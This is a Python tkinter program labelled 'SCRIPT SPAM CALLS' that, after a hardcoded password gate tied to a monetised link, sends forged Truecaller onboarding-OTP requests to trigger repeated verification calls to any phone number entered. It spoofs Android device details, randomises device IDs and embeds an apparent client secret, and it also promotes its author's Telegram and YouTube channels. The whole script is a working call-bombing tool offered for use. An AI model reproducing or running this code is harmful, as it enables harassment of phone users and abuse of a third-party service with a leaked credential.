import tkinter as tk
from tkinter import *
from tkinter import ttk 
import webbrowser as wb 

w=Tk()
txt=StringVar()



w.config(bg="black")

tk.Label(w,text='           SCRIPT SPAM CALLS         ',fg="blue",bg="white",font="arial 13 bold").pack()



c=tk.Label (w,text='Enter The Script Password',font='arial 7 bold',fg='black',bg='white').place (x=190,y=200)
    
    
Password1=StringVar()
    
r=tk.Entry (w,width=20,textvariable=Password1,fg='green').place (x=190,y=270)



Password="https://bestcash2020.com/6xJAL6P"

new=1
def openweb():
    wb.open(Password,new=new)
tk.Button (w,text="Get on Password",font="arial 7 bold",fg="blue",bg="white",padx=2,command=openweb).place(x=250,y=110) 


def SUBMIT ():

    if str(Password1. get())=="Abdullah3444":
        #tk.Label (w,text="welcome",fg="green").place (x=230,y=300)



        c=tk.Label (w,text='Enter Number ',font='arial 9 bold',fg='green',bg='white').place (x=250,y=460)
        
        
        number=StringVar()
        
        tk.Entry (w,width=20,textvariable=number,fg='green').place (x=190,y=527)
        
        
        
        
        def call():
            import random
            from time import sleep 
            import requests 
            c=("1234567890")
            m=("1234567890")
            k=("1234567890")
            rand1=''.join(random.choice(c))
            rand2=''.join(random.choice(m))
            rand3=''.join(random.choice(k))
            
            url='https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'
            
            headers={
            "Host": "account-asia-south1.truecaller.com",
            
            "content-type": "application/json; charset=UTF-8",
            "content-length": "580",
            
            "accept-encoding": "gzip",
            "user-agent": "Truecaller/12.20.6 (Android;7.0)",
            
            "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
            }
            
            data={
              "countryCode": "eg",
              "dialingCode": 20,
              "installationDetails": {
                "app": {
                  "buildVersion": 6,
                  "majorVersion": 12,
                  "minorVersion": 20,
                  "store": "GOOGLE_PLAY"
                },
                "device": {
                  "deviceId": rand1+rand2+rand3+"7cd17e37d121d",
                  "language": "ar",
                  "manufacturer": "Infinix",
                  "mobileServices": [
                    "GMS"
                  ],
                  "model": "Infinix X559C",
                  "osName": "Android",
                  "osVersion": "7.0",
                  "simSerials": [ rand1+rand2+rand3+"0018521312806439f"
                  ]
                },
                "language": "ar",
                "sims": [
                  {
                    "imsi": "602018531280643",
                    "mcc": "602",
                    "mnc": "2",
                    "operator": "Orange EG"
                  }
                ],
                "storeVersion": {
                  "buildVersion": 6,
                  "majorVersion": 12,
                  "minorVersion": 20
                }
              },
              "phoneNumber": str(number.get()),
              "region": "region-2",
              "sequenceNo": 4
            }
            
            
            
            
            r=requests.post (url,headers=headers, json=data)
         
            
            if (r.json()["status"])==1:        
                
                tk.Label (w,width='20',fg="blue",bg="white",text='Done Call',padx=8).place (x=170,y=660)
            
            
            elif(r.json()["status"])==5:
                tk.Label (w,text='Try After 24 Hours For This Number',bg="red").place (x=120,y=660)
            
            elif(r.json()["status"])==9:
                tk.Label (w,text='Wait a minute and try again',bg="red").place (x=120,y=650)
            
            
            
            elif (r.json()["status"])==4:
                tk.Label (w,text="can't call try Later").place (x=210,y=660)
            
            
            else:
                tk.Label (w,text="  Can't Call Try Later  ",bg="red").place (x=210,y=660)
        
        
        tk.Button (w,text="CALL",font="arial 9 bold",fg='black',bg='#30f1ff',command=call).place (x=295,y=590)
            
        
        
        
        
        
        ########################################تفاصيل خاصه  باللوجو                             
        
        
        from PIL import Image, ImageTk
        from urllib.request import urlopen
        
        try:
            URL = "https://e.top4top.io/p_2423l3z1m0.jpg"
            u = urlopen(URL)
            raw_data = u.read()
            u.close()
            photo = ImageTk.PhotoImage(data=raw_data)
                    
            label = tk.Label(image=photo)
            label.image = photo
            label.place (x=65,y=710)
        
        except:
             tk.Label(w, text = 'Make sure the internet is turned on ! ', font = 'arial 8 bold',fg="red",bg="#96DEBA").place(x=95 , y = 750)
        
        
        ######################################
        
        
        
        
        
        import webbrowser as wb 
        
        tk.Label(w, text = 'Projected By Abdullah Salah', font = 'arial 8 bold',fg="blue",bg="white").place(x= 162, y = 1220)
        
        
        #################################
        
        
        new=1
        url1 = "https://t.me/Techno0099"
        url2="https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg"
        
        
        
        def openweb():
            wb.open(url1,new=new)
        tk.Button (w,text="Telegram Channel",font="arial 8 bold",fg="blue",bg="white",padx=2,command=openweb).place(x=20,y=1300)
        
        
        #################################
        
        
        def openweb():
            wb.open(url2,new=new)
        tk.Button (w,text="Youtube Channel",font="arial 8 bold",fg="blue",bg="white",padx=2,command=openweb).place(x=450,y=1300) 

    else:
        tk.Label (w,text="Error Password", bg="red").place (x=250,y=500)

        
tk.Button (w,text="SUBMIT",font="arial 8 bold",fg='black',bg='#30f1ff',command=SUBMIT).place (x=270,y=330)
      
        
    
    
    
 
        
w.mainloop()
